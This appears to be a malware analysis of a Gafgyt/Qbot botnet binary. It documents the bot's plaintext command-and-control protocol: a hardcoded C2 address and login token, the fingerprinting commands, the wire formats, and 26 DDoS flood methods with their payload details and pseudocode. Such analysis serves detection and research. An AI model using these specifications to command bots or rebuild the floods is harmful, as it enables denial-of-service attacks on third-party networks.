# Gafgyt/Qbot Botnet — Communication Layer Technical Specification

## Binary Identity

| Property | Value |
|----------|-------|
| **File** | `notstripped` (ELF 32-bit MIPS LE) |
| **Bot ID** | `ghostc2bot` (embedded login token) |
| **Default C2** | `94.154.43.158:2323` |
| **C2 Port (default)** | `2323` (`0x913`) |

---

## 1. Session Establishment

### 1.1 Observed Behavior

The session establishment is a **three-phase plaintext exchange** with no cryptographic handshake, no challenge-response, and no server-side validation of the bot's identity. The bot connects, announces itself with a hardcoded token, performs local system fingerprinting, and sends the results as its "login" message. The C2 server does not send any initial response; it begins sending commands immediately.

**Phase 1 — TCP Connect**

```
Bot ──[TCP SYN]──> C2 (94.154.43.158:2323)
Bot <──[TCP SYN+ACK]── C2
Bot ──[TCP ACK]──> C2
```

The bot calls `connect_host(host, port)` which performs a standard `getaddrinfo`/`socket`/`connect` sequence. On failure, it retries every 10 seconds indefinitely.

**Phase 2 — Login Token**

Immediately after TCP connect succeeds, the bot sends a **36-byte plaintext token**:

```
Bot ──[36 bytes]──> C2
```

The payload is the ASCII string:

```
ghostc2botsecretreuisdhfeuishfuish\r\n
```

Byte-by-byte breakdown (36 bytes total):

| Offset | Bytes | Value | Description |
|--------|-------|-------|-------------|
| 0–10 | 11 | `ghostc2bot` | Bot family identifier |
| 11–36 | 25 | `secretreuisdhfeuishfuish\r\n` | Hardcoded secret suffix + CRLF |

This is sent via `send_all(fd, token_ptr, 36)` with no transformation.

**Phase 3 — System Fingerprinting & Login Message**

The bot executes two shell commands to gather system information, then sends a formatted login line.

**Command 1 — Architecture:**
```
uname -m
```
Reads the first line of output (up to 64 bytes), strips trailing `\n`/`\r`.

**Command 2 — Distribution:**
```
cat /etc/os-release 2>/dev/null | grep -E '^ID=' | cut -d= -f2 | tr -d '"'
```
Reads the first line of output (up to 64 bytes), strips trailing `\n`/`\r`.

**Fallback logic:**
- If the distro string is empty or equals `unknown`, the bot runs a third command:
  ```
  busybox --help 2>/dev/null | head -1
  ```
- If the output of this command contains `BusyBox`, the distro string is replaced with the hardcoded value `LINUX_2.6` (at address `0x31e68`).
- If the distro string is still empty after all checks, it is set to `linux` (little-endian encoding: `0x756e696c` = `"linu"` + `0x78` = `'x'`, producing `"linux"`).

**Login message format:**
```
ARCH:{arch_string} {bandwidth}\r\n
```
Where:
- `{arch_string}` = `linux.{arch}.{distro}` (constructed via `snprintf(buf, 128, "linux.%s.%s", arch, distro)`)
- `{bandwidth}` = result of `measure_bandwidth()` — **always returns `0.0`** (the function is a stub returning zero)

**Example login message:**
```
ARCH:linux.mips.linux 0.00\r\n
```

This is sent via `send_all(fd, login_msg, strlen(login_msg))`.

**No server response is read or validated at this point.** The bot immediately enters the command loop.

### 1.2 Handshake Logic (Pseudocode)

```
function establish_session(host, port):
    while true:
        fd = connect_host(host, port)
        if fd >= 0:
            break
        print("[CONNECT] Failed, retrying in 10s")
        sleep(10)

    print("[CONNECT] Connected!")

    // Phase 2: Send login token
    login_token = "ghostc2botsecretreuisdhfeuishfuish\r\n"  // 36 bytes
    send_all(fd, login_token, 36)

    // Phase 3: System fingerprinting
    arch = popen_and_read("uname -m")
    distro = popen_and_read("cat /etc/os-release 2>/dev/null | grep -E '^ID=' | cut -d= -f2 | tr -d '\"'")
    
    if distro == "" or distro == "unknown":
        busybox_output = popen_and_read("busybox --help 2>/dev/null | head -1")
        if "BusyBox" in busybox_output:
            distro = "LINUX_2.6"
    
    if distro == "":
        distro = "linux"
    
    arch_string = sprintf("linux.%s.%s", arch, distro)
    bandwidth = measure_bandwidth()  // Always returns 0.0
    login_msg = sprintf("ARCH:%s %.2f\r\n", arch_string, bandwidth)
    send_all(fd, login_msg, strlen(login_msg))
    
    return fd
```

### 1.3 Success/Failure Handling

| Condition | Behavior |
|-----------|----------|
| TCP connect succeeds | Proceed to Phase 2 |
| TCP connect fails | Print `[CONNECT] Failed, retrying in 10s`, sleep 10s, retry (infinite loop) |
| Login token sent | No acknowledgment expected; proceed to fingerprinting |
| Login message sent | No acknowledgment expected; proceed to command loop |
| `recv_line` returns ≤ 0 during command loop | Close socket, print `[CONNECT] Disconnected, reconnecting in 5s`, sleep 5s, restart from Phase 1 |
| Any command parsing yields invalid format | Silently skip line and continue reading next command |

**Verified Fact:** The bot never validates that the C2 server accepted its login. It sends the token and fingerprint, then immediately starts reading commands. There is no server challenge, no session ID assignment, and no cryptographic handshake.

---

## 2. Cryptography

### 2.1 Observed Behavior

**No encryption or encoding is applied to C2 communication.** All data is transmitted as plaintext ASCII over a raw TCP socket. There is no:

- XOR obfuscation
- Base64 encoding (the `base64_encode` function exists but is used only for exploit payloads, not C2 traffic)
- URL encoding (the `url_encode` function exists but is used only for exploit payloads, not C2 traffic)
- AES, RC4, or any other cipher
- Custom encoding or scrambling

### 2.2 Specification

| Property | Value |
|----------|-------|
| Encryption | **None** |
| Encoding | **None** (plaintext ASCII) |
| Transport | Raw TCP stream (no TLS) |
| Port | 2323 (default, configurable via argv[2]) |

### 2.3 Decryption Routine (Pseudocode)

```
function process_incoming_data(raw_bytes):
    // No decryption needed — data is plaintext ASCII
    return raw_bytes
```

**Verified Fact:** The C2 protocol uses zero cryptographic operations. All messages are sent and received as raw ASCII text terminated by newline characters.

---

## 3. Main Command Loop

### 3.1 Observed Behavior

After sending the login message, the bot enters an infinite command processing loop:

1. **Receive:** Call `recv_line(fd, buffer, 8192)` which reads bytes one at a time via `recv(fd, &c, 1, 0)` until a `\n` (0x0A) byte is received or the buffer is full.
2. **Tokenize:** Call `strtok(buffer, " \r\n")` to extract the first whitespace-delimited token (command name).
3. **Dispatch:**
   - If the first token equals `PING` → send `PONG\r\n` (6 bytes).
   - If the first token matches any known attack command name → parse three additional tokens (target IP, port, duration) and call `start_attack(command, target, port, duration)`.
   - If the first token does not match any known command → silently discard the line and continue.
4. **Loop:** Repeat from step 1.

### 3.2 Protocol Specification

#### 3.2.1 Message Framing

| Property | Value |
|----------|-------|
| Framing | **Newline-delimited** (line-based) |
| Delimiter | `\n` (0x0A) |
| Max line length | 8192 bytes (buffer `local_2208[8192]`) |
| Token delimiter | `" \r\n"` (space, CR, LF) |
| Encoding | ASCII |

#### 3.2.2 Message Format

```
COMMAND [ARG1] [ARG2] [ARG3] ...\n
```

Fields are separated by any combination of space (`0x20`), carriage return (`0x0D`), or newline (`0x0A`).

#### 3.2.3 Opcode / Command Definitions

##### PING Command

| Field | Value | Description |
|-------|-------|-------------|
| **Command** | `PING` | Literal ASCII string `PING` |
| **Arguments** | None | |
| **Response** | `PONG\r\n` (6 bytes) | Sent immediately via `send_all` |

##### Attack Commands

| Field | Description |
|-------|-------------|
| **Command** | Attack method name (see table below) |
| **ARG1** | Target IP address (dotted decimal, e.g., `192.168.1.1`) |
| **ARG2** | Target port (decimal integer, e.g., `80`) |
| **ARG3** | Attack duration in seconds (decimal integer, capped at `3600` = `0xe10`) |

**Example C2 command:**
```
UDP 192.168.1.100 80 300\n
```

This instructs the bot to launch a UDP flood against `192.168.1.100:80` for 300 seconds.

#### 3.2.4 Complete Attack Command Table

| ID | Command String | Threads | Attack Type | Description |
|----|---------------|---------|-------------|-------------|
| 1 | `FIVEM` | 2 | FiveM game server flood | Sends 18-byte `"getinfo xxx"` payload via UDP |
| 2 | `VSE` | 2 | Valve Source Engine query flood | Sends 25-byte `"TSource Engine Query"` payload via UDP |
| 3 | `MCPE` | 2 | Minecraft PE flood | Sends 60-byte custom payload via UDP |
| 4 | `HEX` | 2 | Hex payload flood | Sends 8-byte hex data via UDP |
| 5 | `UDP` | 4 | Generic UDP flood | Sends 0xFFE3 bytes of `0x41` ('A') via UDP |
| 6 | `UDP-BIG` | 4 | Large random UDP flood | Sends 0xFFE3 bytes of random data via UDP with broadcast socket option |
| 7 | `UDP-PLAIN` | 4 | Plain random UDP flood | Sends 0x578 bytes of random data via UDP |
| 8 | `UDP-BYPASS` | 4 | DNS amplification bypass | Forges DNS queries using random subdomains against public resolvers (8.8.8.8, 1.1.1.1, 9.9.9.9, 208.67.222.222, 64.6.64.6) |
| 9 | `BANDWIDTH-UDP` | 6 | Bandwidth saturation UDP | Sends 0xFFE3 bytes of `0x41` ('A') via UDP with `SO_SNDBUF` set to 1 (bandwidth throttle bypass) |
| 10 | `PPS-UDP` | 6 | High PPS UDP flood | Sends 0x80 bytes of random data via UDP |
| 11 | `TCP` | 4 | TCP connection flood | Connects and sends random data (0x400 or 0x800 bytes) over TCP |
| 12 | `BANDWIDTH-TCP` | 6 | Bandwidth TCP flood | Connects and sends 0x10000 bytes of random data over TCP |
| 13 | `PPS-TCP` | 6 | High PPS TCP flood | Connects and sends 0x40 bytes of random data via `send` with `MSG_NOSIGNAL` |
| 14 | `TCPBYPASS` | 4 | TCP SYN flood | Sends raw TCP SYN packets via raw socket |
| 15 | `OVHDROP` | 6 | OVH DDoS bypass | Sends 0x5B4 random bytes for first 50 packets, then 0x4F-byte OVH drop payload, cycling |
| 16 | `UDPHEX` | 4 | UDP hex flood | Sends 0x5B2 random bytes via UDP |
| 17 | `OVH` | 6 | OVH bypass flood | Sends 0x76-byte OVH payload cycling every 50 packets |
| 18 | `MIX` | 4 | Mixed UDP/TCP flood | Alternates between UDP random data and TCP random data |
| 19 | `SYN` | 4 | TCP SYN flood (raw) | Sends raw TCP SYN packets via raw socket |
| 20 | `HTTPGET` | 2 | HTTP GET flood | Connects and sends `GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random_ua}\r\nConnection: keep-alive\r\n\r\n` |
| 21 | `HTTPPOST` | 2 | HTTP POST flood | Connects and sends `POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random_ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len}\r\nConnection: close\r\n\r\n{body}` |
| 22 | `BROWSER` | 2 | Full browser GET flood | Connects and sends full HTTP GET with realistic headers |
| 23 | `BROWSER-2` | 2 | Browser login GET flood | Connects and sends `GET /login` with Referer header |
| 24 | `BROWSER-3` | 2 | Browser search POST flood | Connects and sends `POST /search?q=test` with realistic headers |
| 25 | `MCJAVA` | 4 | Minecraft Java edition flood | Connects, sends MC handshake (10 bytes), status request (0 bytes), reads response, sends ping (9 bytes) |
| 26 | `ADMIN-UDP` | 12 | Admin login form flood | Sends hex-encoded login form body (`username=admin&password=password123&email=admin@example.com&submit=login`) via UDP |

#### 3.2.5 Attack Threading Model

`start_attack` spawns `N` threads (where N = thread count from the table above) via `pthread_create`/`pthread_detach`. Each thread receives a `malloc`'d argument structure:

```c
struct attack_args {
    char name[16];          // offset 0x00 — Attack command name (null-terminated, max 15 chars)
    char target[256];       // offset 0x10 — Target IP string (null-terminated, max 255 chars)
    uint32_t port;          // offset 0x110 — Target port (network byte order)
    uint32_t duration;      // offset 0x114 — Attack duration in seconds
    int thread_id;          // offset 0x118 — Thread index (0 to N-1)
    uint32_t seed;          // offset 0x11C — Per-thread RNG seed: time(0) ^ (thread_id * 0x61C88647)
};
```

The seed calculation uses the Golden Ratio constant `0x61C88647` (which is `2^32 * (sqrt(5)-1)/2`) to produce distinct non-colliding seeds per thread.

Each thread runs `attack_loop(args_struct)` which:
1. Parses the attack name from the argument structure
2. Creates the appropriate socket type
3. Enters a timed send loop: `while (time(0) < start_time + duration) { send_packet(); }`
4. Cleans up and exits

#### 3.2.6 Dynamic Registration

**Verified Fact:** This binary does **not** support dynamic registration of commands or attack methods at runtime. All attack command names and their corresponding behaviors are hardcoded at compile time. The dispatch is performed via a static chain of `strcmp` comparisons in both `main` (for parsing) and `attack_loop` (for execution).

### 3.3 Message Processing Logic (Pseudocode)

```
function command_loop(fd):
    buffer[8192]
    
    while true:
        bytes_read = recv_line(fd, buffer, 8192)
        
        if bytes_read <= 0:
            // Connection lost
            close(fd)
            print("[CONNECT] Disconnected, reconnecting in 5s")
            sleep(5)
            return  // Will cause outer loop to reconnect
        
        // Tokenize
        command = strtok(buffer, " \r\n")
        if command == NULL:
            continue  // Empty line, skip
        
        // Check for PING
        if strcmp(command, "PING") == 0:
            send_all(fd, "PONG\r\n", 6)
            continue
        
        // Check for attack commands
        if is_attack_command(command):
            target = strtok(NULL, " \r\n")
            port_str = strtok(NULL, " \r\n")
            duration_str = strtok(NULL, " \r\n")
            
            if target != NULL and port_str != NULL and duration_str != NULL:
                port = atoi(port_str)
                duration = atoi(duration_str)
                if duration > 3600:
                    duration = 3600
                start_attack(command, target, port, duration)
        
        // If command is not recognized, silently ignore
```

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The protocol has **no heartbeat mechanism, no keepalive pings, no periodic status reports, and no execution acknowledgments** beyond the PING/PONG exchange.

### 4.2 Response Packet Formats

#### PING/PONG Exchange

| Direction | Payload | Size | Trigger |
|-----------|---------|------|---------|
| C2 → Bot | `PING` | 4 bytes + `\n` (from recv_line) | Server-initiated |
| Bot → C2 | `PONG\r\n` | 6 bytes | Upon receiving `PING` |

**Wire format (Bot → C2):**
```
Offset  Bytes  Value (hex)    ASCII
0       1      50             'P'
1       1      4F             'O'
2       1      4E             'N'
3       1      47             'G'
4       1      0D             '\r'
5       1      0A             '\n'
```

#### Attack Execution

**No acknowledgment is sent** when an attack starts, runs, or completes. The `start_attack` function prints a local debug message via `printf("[ATTACK] %s %s:%d for %ds\n", name, target, port, duration)` but this output goes to `stdout` (which is typically closed after daemonization) and is never transmitted to the C2.

### 4.3 Feedback Logic (Pseudocode)

```
// There is no periodic feedback. The only server-initiated interaction is:
function handle_ping(fd):
    send_all(fd, "PONG\r\n", 6)
    // No other feedback is ever generated
```

### 4.4 Session Lifecycle

| Event | Behavior |
|-------|----------|
| **Normal operation** | Bot reads commands in a blocking loop via `recv_line`. No timers, no sequence numbers, no message IDs. |
| **PING received** | Bot sends `PONG\r\n` and continues. No state change. |
| **Attack command received** | Bot spawns attack threads and returns to command loop immediately. Attacks run in background. |
| **Connection lost** | `recv_line` returns -1. Bot closes socket, prints `[CONNECT] Disconnected, reconnecting in 5s`, sleeps 5s, and restarts from Phase 1 (TCP connect). |
| **Graceful termination** | Not implemented. The bot does not handle any "quit" or "shutdown" command. The only way to terminate is to kill the process or close the TCP connection. |
| **Session identifiers** | Not implemented. No cookies, tokens, or session IDs are exchanged. |
| **Sequence numbers** | Not implemented. No ordering guarantees beyond TCP stream ordering. |

---

## 5. Analysis Gaps

| Gap | Reason |
|-----|--------|
| **C2 server response to login** | The bot never reads or validates any server response after sending the login message. It immediately enters the command loop. Whether the server sends an acknowledgment, a session token, or an error is not observable from the client binary. |
| **Bandwidth measurement** | `measure_bandwidth()` at `0x13cac` is a stub that returns `0.0` unconditionally. The intended measurement mechanism (if any) is not implemented or was stripped. |
| **Attack effectiveness** | The specification documents the exact packets sent by each attack method, but the effectiveness against specific targets or mitigations cannot be determined from the binary alone. |
| **C2 server protocol** | The server-side implementation of the protocol is not present in this binary. The documented behavior is based entirely on the client's send/receive patterns. |

---

## 6. Protocol Constants Summary

| Constant | Value | Location |
|----------|-------|----------|
| Default C2 host | `94.154.43.158` | `0x31514` |
| Default C2 port | `2323` (`0x913`) | Hardcoded in `main` |
| Login token | `ghostc2botsecretreuisdhfeuishfuish\r\n` (36 bytes) | `0x3157c` |
| PONG response | `PONG\r\n` (6 bytes) | `0x31668` |
| Token delimiter | `" \r\n"` | `0x3165c` |
| PING command | `PING` | `0x31660` |
| Fallback distro | `LINUX_2.6` | `0x31e68` |
| Default distro | `linux` | Constructed in code |
| Max duration | `3600` seconds (`0xe10`) | Hardcoded in `main` |
| Max line length | `8192` bytes | Stack buffer size |
| Max threads per attack | `12` (ADMIN-UDP) | Computed in `start_attack` |
| Min threads per attack | `2` (FIVEM, VSE, MCPE, HEX, HTTPGET, HTTPPOST, BROWSER, BROWSER-2, BROWSER-3) | Computed in `start_attack` |
| RNG seed constant | `0x61C88647` (Golden Ratio) | `start_attack` |
| Socket timeout | Blocking (no timeout set) | N/A |
| Reconnect delay | `5` seconds (on disconnect) | `main` loop |
| Initial retry delay | `10` seconds (on connect failure) | `main` loop |

---

## 7. Complete Wire Format Summary

### C2 → Bot

```
PING\n
```
or
```
{ATTACK_NAME} {TARGET_IP} {PORT} {DURATION}\n
```

### Bot → C2

**Login phase:**
```
ghostc2botsecretreuisdhfeuishfuish\r\n
ARCH:linux.{arch}.{distro} {bandwidth}\r\n
```

**Command response:**
```
PONG\r\n
```

**Verified Fact:** No other messages are ever sent from the bot to the C2 server.
